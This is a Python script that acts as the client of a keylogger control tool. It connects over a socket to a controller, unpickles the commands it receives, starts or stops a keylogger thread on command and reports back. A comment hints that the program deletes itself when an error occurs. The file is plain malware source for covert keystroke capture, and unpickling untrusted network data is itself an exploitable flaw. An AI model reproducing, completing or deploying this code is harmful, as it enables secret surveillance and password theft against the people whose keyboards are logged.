import socket, pickle, subprocess
import keylogger, threading

try:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('127.0.0.1', 44102))

    keylog_activated = False

    while True:
        data = client.recv(5000)
        cmd = pickle.loads(data)
        if cmd == ['start', 'keylogger']:
            if keylog_activated == False:
                try:
                    start_logger = threading.Thread(target=keylogger.start_keylogger)
                    start_logger.start()
                    client.send(b"[+]keylogger started")
                    keylog_activated = True
                    print("keylogger started")
                except Exception as err:
                    client.send(f"[-]keylogger start failure: {str(err)}".encode('utf-8')) 
            else:
                client.send(b'[-] Keylogger program already started')
        elif cmd == ['stop', 'keylogger']:
            if keylog_activated == True:
                try:
                    stop_logger = threading.Thread(target=keylogger.stop_keylogger)
                    stop_logger.start()
                    client.send(b"keylogger stopped")
                    keylog_activated = False
                    print("keylogger stopped")
                except Exception as err:
                    client.send(f"[-]keylogger stop failure: {str(err)}".encode('utf-8'))  
            else:
                client.send(b'[-] keylogger program not started')
        else:
            client.send(b"Unknown command")

except Exception as err:
    pass
    #run delete program
finally:
    client.close()

